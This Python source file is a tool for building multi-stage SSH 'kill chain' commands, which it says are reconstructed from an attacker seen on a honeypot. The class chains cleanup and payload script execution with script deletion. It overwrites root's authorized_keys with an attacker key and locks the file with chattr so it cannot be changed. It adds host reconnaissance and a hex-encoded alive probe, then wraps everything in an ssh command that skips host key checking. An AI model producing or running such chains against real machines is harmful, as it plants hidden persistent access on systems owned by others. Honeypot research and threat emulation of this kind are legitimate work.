#!/usr/bin/env python3
"""Compound SSH kill chain: single-command multi-stage execution.
Reconstructed from real attacker TTP (130.12.180.51, Cowrie honeypot, 2026-02-08).
Entire operation in ONE semicolon-chained command:
  cleanup → payload → persist → recon → validate
All 4 sessions used identical command, SSH-2.0-Go client, 7-11s per session.
"""
import os
import sys

class CompoundKillChain:
    """Build single-command kill chains for SSH sessions."""

    def __init__(self):
        self.stages = []

    def add_cleanup(self, script_name: str = "clean.sh"):
        """Stage: execute and delete cleanup script."""
        self.stages.append({
            "name": "cleanup",
            "commands": [
                f"chmod +x {script_name}",
                f"sh {script_name}",
                f"rm -rf {script_name}"
            ]
        })
        return self

    def add_payload(self, script_name: str = "setup.sh"):
        """Stage: execute and delete payload script."""
        self.stages.append({
            "name": "payload",
            "commands": [
                f"chmod +x {script_name}",
                f"sh {script_name}",
                f"rm -rf {script_name}"
            ]
        })
        return self

    def add_ssh_persistence(self, pubkey: str, user: str = "root"):
        """Stage: plant SSH key with chattr protection."""
        ssh_dir = "/root/.ssh" if user == "root" else f"/home/{user}/.ssh"
        ak = f"{ssh_dir}/authorized_keys"
        self.stages.append({
            "name": "ssh_persist",
            "commands": [
                f"mkdir -p {ssh_dir}",
                f"chattr -ia {ak}",
                f'echo "{pubkey}" > {ak}',
                f"chattr +ai {ak}"
            ]
        })
        return self

    def add_recon(self, commands: list = None):
        """Stage: host reconnaissance."""
        cmds = commands or ["uname -a"]
        self.stages.append({
            "name": "recon",
            "commands": cmds
        })
        return self

    def add_validation(self, token: str = "auth_ok"):
        """Stage: hex-encoded alive probe."""
        hex_chars = "".join(f"\\x{ord(c):02x}" for c in token + "\n")
        self.stages.append({
            "name": "validation",
            "commands": [f'echo -e "{hex_chars}"']
        })
        return self

    def add_custom(self, name: str, commands: list):
        """Stage: arbitrary commands."""
        self.stages.append({"name": name, "commands": commands})
        return self

    def build(self) -> str:
        """Build the compound command (semicolon-chained)."""
        all_cmds = []
        for stage in self.stages:
            all_cmds.extend(stage["commands"])
        return "; ".join(all_cmds)

    def build_ssh_command(self, target: str, user: str = "root",
                          key_path: str = None, port: int = 22) -> str:
        """Build full SSH command with the compound chain."""
        chain = self.build()
        ssh_parts = ["ssh", "-o", "StrictHostKeyChecking=no"]
        if key_path:
            ssh_parts.extend(["-i", key_path])
        if port != 22:
            ssh_parts.extend(["-p", str(port)])
        ssh_parts.extend([f"{user}@{target}", chain])
        return " ".join(ssh_parts)

    @classmethod
    def brazilian_template(cls, pubkey: str) -> "CompoundKillChain":
        """Reproduce the exact Brazilian attacker pattern."""
        chain = cls()
        chain.add_cleanup("clean.sh")
        chain.add_payload("setup.sh")
        chain.add_ssh_persistence(pubkey)
        chain.add_recon(["uname -a"])
        chain.add_validation("auth_ok")
        return chain


if __name__ == "__main__":
    key = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDemo rsa-key-20230629"
    chain = CompoundKillChain.brazilian_template(key)
